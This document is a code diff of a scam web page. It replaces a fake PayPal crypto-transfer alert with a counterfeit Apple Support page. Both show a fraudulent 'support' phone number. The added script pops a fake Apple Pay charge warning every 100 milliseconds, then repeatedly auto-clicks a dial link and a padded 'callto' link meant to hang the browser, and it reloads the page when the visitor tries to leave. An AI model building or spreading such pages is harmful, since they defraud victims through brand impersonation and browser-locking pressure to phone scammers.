@@ -1,8 +1,8 @@
+
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-	<!-- Fathom - beautiful, simple website analytics -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+
+<!-- Fathom - beautiful, simple website analytics -->
 <script src="https://cdn.usefathom.com/script.js" data-site="AUNKREGL" defer></script>
 <!-- / Fathom -->
 <!-- Google tag (gtag.js) -->
@@ -14,381 +14,364 @@
 
   gtag('config', 'AW-10804014294');
 </script>
-	
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal Crypto Transfer Successful</title>
-    <style>
-        /* Reset styles for better email compatibility */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background-color: #f5f7fa;
-            padding: 20px;
-            line-height: 1.4;
-        }
-        
-        .email-container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: white;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-        
-        .header-section {
-            background: linear-gradient(135deg, #a8d5f2 0%, #7bb3d9 100%);
-            padding: 30px 30px 30px 30px;
-            text-align: center;
-        }
-        
-        .paypal-logo {
-            width: 140px;
-            height: auto;
-        }
-        
-        .title-section {
-            background-color: white;
-            padding: 20px 30px;
-            text-align: center;
-        }
-        
-        .success-title {
-            color: #003087;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-        
-        .toll-free-section {
-            text-align: center;
-        }
-        
-        .toll-free-text {
-            color: #0070ba;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .toll-number {
-            color: #003087;
-            font-size: 14px;
-            font-weight: 600;
-            margin-left: 10px;
-        }
-        
-        .content-section {
-            padding: 30px;
-        }
-        
-        .user-info {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        
-        .transfer-message {
-            color: #333;
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        
-        .amount-highlight {
-            color: #0070ba;
-            font-weight: 600;
-        }
-        
-        .details-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 25px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-        
-        .details-table td {
-            padding: 15px 20px;
-            border-bottom: 1px solid #e1e8ed;
-        }
-        
-        .detail-label {
-            background-color: #0070ba;
-            color: white;
-            font-weight: 600;
-            font-size: 14px;
-            width: 180px;
-        }
-        
-        .detail-value {
-            background-color: #f8f9fa;
-            color: #333;
-            font-size: 14px;
-        }
-        
-        .footer-warning {
-            color: #666;
-            font-size: 12px;
-            line-height: 1.4;
-            margin-bottom: 25px;
-        }
-        
-        .coinbase-section {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .coinbase-logo {
-            width: 120px;
-            height: auto;
-        }
-        
-        .unsubscribe-section {
-            background-color: #0070ba;
-            color: white;
-            padding: 20px;
-            text-align: center;
-            font-size: 12px;
-            line-height: 1.4;
-        }
-        
-        .unsubscribe-section a {
-            color: white;
-            text-decoration: underline;
-        }
-        
-        /* Popup Modal Styles */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
-        }
-        
-        .modal-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-        
-        .modal-content {
-            background: white;
-            border-radius: 12px;
-            max-width: 380px;
-            width: 90%;
-            margin: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-            transform: scale(0.8);
-            transition: transform 0.3s ease;
-            overflow: hidden;
-        }
-        
-        .modal-overlay.active .modal-content {
-            transform: scale(1);
-        }
-        
-        .modal-body {
-            padding: 25px;
-            text-align: center;
-        }
-        
-        .alert-box {
-            background-color: #f8f9fa;
-            color: #333;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 1.5;
-            text-align: left;
-            border: 1px solid #e1e8ed;
-        }
-        
-        .phone-highlight {
-            color: #0070ba;
-            font-weight: 600;
-        }
-        
-        .modal-buttons {
-            display: flex;
-            gap: 8px;
-            margin-top: 15px;
-        }
-        
-        .modal-btn {
-            flex: 1;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .btn-cancel {
-            background-color: #f0f0f0;
-            color: #0070ba;
-        }
-        
-        .btn-cancel:hover {
-            background-color: #e0e0e0;
-        }
-        
-        .btn-call {
-            background-color: #0070ba;
-            color: white;
-        }
-        
-        .btn-call:hover {
-            background-color: #005a9a;
-        }
-        
-        /* Responsive design */
-        @media (max-width: 600px) {
-            .email-container {
-                margin: 10px;
-                border-radius: 0;
-            }
-            
-            .header-section {
-                padding: 30px 20px;
-            }
-            
-            .content-section {
-                padding: 20px;
-            }
-            
-            .details-table {
-                font-size: 13px;
-            }
-            
-            .detail-label,
-            .detail-value {
-                padding: 12px 15px;
-            }
-        }
-    </style>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
+
 </head>
+
 <body>
-    <div class="email-container">
-        <!-- Header Section with PayPal branding -->
-        <div class="header-section">
-            <img src="https://logos-world.net/wp-content/uploads/2020/07/PayPal-Logo.png" alt="PayPal" class="paypal-logo">
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-        
-        <!-- Title and Toll Free Section -->
-        <div class="title-section">
-            <h1 class="success-title">Crypto Transfer Successful</h1>
-            <div class="toll-free-section">
-                <span class="toll-free-text">Toll Free Number</span>
-                <span class="toll-number">1 (833) 712-4427</span>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support 1 (833) 712-4427 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-        </div>
-        
-        <!-- Main Content -->
-        <div class="content-section">
-            <div class="user-info">
-                support@paypal.com]
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
             </div>
-            
-            <div class="transfer-message">
-                You have successfully transferred <span class="amount-highlight">$451.60 BTC</span> from your PayPal Crypto Wallet to <span class="amount-highlight">[Remedios's Coinbase Wallet 31359]</span>.
-            </div>
-            
-            <!-- Transaction Details Table -->
-            <table class="details-table">
-                <tr>
-                    <td class="detail-label">Transaction ID</td>
-                    <td class="detail-value">WEQ-2025WEQ-42H3-4855</td>
-                </tr>
-                <tr>
-                    <td class="detail-label">Amount Transferred</td>
-                    <td class="detail-value">$151.60 B 06 aug 2025</td>
-                </tr>
-                <tr>
-                    <td class="detail-label">Recipient Wallet</td>
-                    <td class="detail-value">Remedios's CBN31359</td>
-                </tr>
-                <tr>
-                    <td class="detail-label">Date & Time</td>
-                    <td class="detail-value">April 01, 2025</td>
-                </tr>
-            </table>
-            
-            <div class="footer-warning">
-                If you did not authorize this transaction, contact support immediately! 🔒 
-                � (USA & Canada).
-            </div>
-            
-            <!-- Coinbase Logo Section -->
-            <div class="coinbase-section">
-                <img src="https://cdn.worldvectorlogo.com/logos/coinbase-1.svg" alt="Coinbase" class="coinbase-logo">
-            </div>
-        </div>
-        
-        <!-- Footer/Unsubscribe Section -->
-        <div class="unsubscribe-section">
-            If you wish to unsubscribe from our services, <a href="#">click here</a> to the mailing list © 2025 Powered by PayPal HSB AUSA. All rights reserved <br>
-            PAYPAL PF HDI P3GDHT7RBVESHFAUJPQMT
-        </div>
+        </section>
     </div>
 
-    <!-- Security Alert Popup Modal -->
-    <div class="modal-overlay" id="securityModal">
-        <div class="modal-content">
-            <div class="modal-body">
-                <div class="alert-box">
-                    Your PayPal account was recently used to transfer $451.60 BTC to Coinbase Wallet! We have placed this request on hold to ensure safety and Security. Not you? Immediately call PayPal Support <span class="phone-highlight">1 (833) 712-4427</span> to Freeze it!
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-                <div class="modal-buttons">
-                    <button class="modal-btn btn-cancel" onclick="callSupport()">Cancel</button>
-                    <button class="modal-btn btn-call" onclick="callSupport()">Call</button>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
                 </div>
-            </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="1 (833) 712-4427
+			 " property="telephone" />
+            </section>
         </div>
-    </div>
+    </footer>
 
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
     <script>
-        function openModal() {
-            document.getElementById('securityModal').classList.add('active');
-        }
-
-        function closeModal() {
-            document.getElementById('securityModal').classList.remove('active');
-        }
-
-        function callSupport() {
-            // Open dialer with dummy number
-            window.location.href = 'tel:+1(833)712-4427';
-        }
-
-        // Close modal when clicking outside
-        document.getElementById('securityModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeModal();
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
             }
-        });
+        };
 
-        // Auto-open modal after 2 seconds for demo
-        setTimeout(function() {
-            openModal();
-        }, 500);
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '1 (833) 712-4427');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:1 (833) 712-4427"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $449.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support 1 (833) 712-4427 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
+
+
+
 </body>
+
+
 </html>
